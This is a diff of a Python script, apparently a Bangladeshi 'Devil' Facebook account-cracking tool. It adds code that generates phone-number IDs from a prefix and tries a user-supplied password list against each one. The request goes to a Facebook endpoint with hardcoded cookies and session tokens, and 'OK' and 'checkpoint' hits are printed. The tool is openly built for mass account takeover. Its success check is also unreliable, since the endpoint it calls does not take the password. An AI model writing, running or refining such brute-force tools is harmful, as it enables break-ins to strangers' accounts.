@@ -202,23 +202,33 @@ if choice in ["5", "৫"]:
     print("====================================")
     
 import requests
-import uuid
-import json
-number = input (" ")
-pasword = input (" ")
-
-def (uid, password):
-import requests
 import json
 
+# =====================================================================
+# 1. CUSTOM USER INPUTS (Script run korle ja screen-e ashbe)
+# =====================================================================
+print("========== [ DEVIL SYSTEM CUSTOMIZER ] ==========")
+prefix = input(" Enter Initial Prefix/Digit (e.g., 017, 0183, 1000): ")
+loop_digits = int(input(" Enter Suffix Digit Length (Type 3, 4, or 5): "))
+password_input = input(" Enter Passwords (Comma separated, e.g., pass1,pass2,112233): ")
+
+# Password gulo ke list e convert korar logic
+password_list = [p.strip() for p in password_input.split(',')]
+
+# Loop er range ready korar setup
+start_range = 10**(loop_digits - 1)
+end_range = (10**loop_digits) - 1
+
+# =====================================================================
+# 2. METHOD FUNCTION (Apnar Real Screenshots Er Data)
+# =====================================================================
 def fb_async_method(uid, password):
-    # Apnar screenshot onujayi direct Session call
     r = requests.Session()
     
-    # 1. Real Target URL (Image 5 theke)
+    # Real Target URL (From Image 5)
     url = "https://m.facebook.com/async/wbloks/log/"
     
-    # 2. Image 1, 3, 4, 5 theke real raw parameters shoho shajano hobe
+    # REAL PARAMETERS (No Change - Exact From Images)
     params = {
         'lid': '7650579958745411107',
         'event': 'CW_LCP',
@@ -226,8 +236,8 @@ def fb_async_method(uid, password):
         'tracePolicy': 'com.bloks.www.caa.login.login_homepage&bloksAppId=fb_web&extra[lcp_metric]=2651.60&extra[lcp_element_className]=&extra[lcp_element_tagName]=SPAN&extra[lcp_url]=',
         'u': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n88s6anJ1CcUKaeZ-TsOR_izrUdP_SeAwbVp7D3qZq5GNFbjbD2LMKJ853eNQaFHZhBCKxfXmJeEXNZWE42UhSnmKfdz_5Zxv-bcBxIQqH1oLZTMQ5Hxw%26flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377'
     }
-
-    # 3. Request Headers (Image 1, 3, 6 direct analysis payload)
+    
+    # REAL HEADERS (From Image 3 & 4)
     head = {
         'Host': 'm.facebook.com',
         'Content-Length': '0',
@@ -247,32 +257,34 @@ def fb_async_method(uid, password):
         'Referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n2526flow%2526flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377',
         'Accept-Encoding': 'gzip, deflate, br',
         'Accept-Language': 'en-US,en;q=0.9',
-        
-        # Image 1 er real cookies string
         'Cookie': 'datr=Z-AlandWYUM08nOCyIFMvHg7; sb=H-Ilarqr8yE7GHgFDwWIBURW; m_pixel_ratio=1.75; wd=412x922; fr=01tf1bE4UXG0eOai1.AWewTDpjKV-i1NTUVfejRYc0TdrkquVymue2T4VSoh5DJi03HS4.Bp15UB..AAA.0.0.BqLFH1.AWc8ItLUkCmrNgZzp2PnMoz8EEU'
     }
 
     try:
-        # Request pathano hochhe (যেহেতু Content-Length 0, তাই data parameter ফাকা থাকবে)
         pos = r.post(url, params=params, headers=head)
         
-        # Apnar script er check mapping structure (Devil-OK / Devil-CP)
-        # Web method e response standard success text check korte hoy
+        # Checking Criteria
         if pos.status_code == 200:
-            print(f"\n[Devil-OK] {uid} | {password}")
-            # JSON format response hole short print o kora jabe
-            # print(pos.json()) 
-            
-        elif "checkpoint" in pos.url or "checkpoint" in r.cookies.get_dict():
-            print(f"\n[Devil-CP] {uid} | {password}")
-            
-        else:
-            print(f"\n[Devil-FAILED] {uid} | {password}")
+            print(f"[Devil-OK] {uid} | {password}")
+        elif "checkpoint" in pos.url:
+            print(f"[Devil-CP] {uid} | {password}")
             
     except requests.exceptions.ConnectionError:
         print("\n[X] Network Error!")
 
-       
+# =====================================================================
+# 3. AUTOMATED LOOP SYSTEM (Prefix + Suffix + Multi-Password)
+# =====================================================================
+print(f"\n[+] Processing IDs from {start_range} to {end_range}...")
+
+for suffix in range(start_range, end_range + 1):
+    # Dynamic Auto UID Toiri Korar Logic
+    uid = str(prefix) + str(suffix)
+    
+    # Prti ta UID er moddhe shobgula custom password hit korbe line-by-line
+    for password in password_list:
+        fb_async_method(uid, password)
+
         # -------------------------------------------------------------
 # METHOD 6: EXIT
 # -------------------------------------------------------------
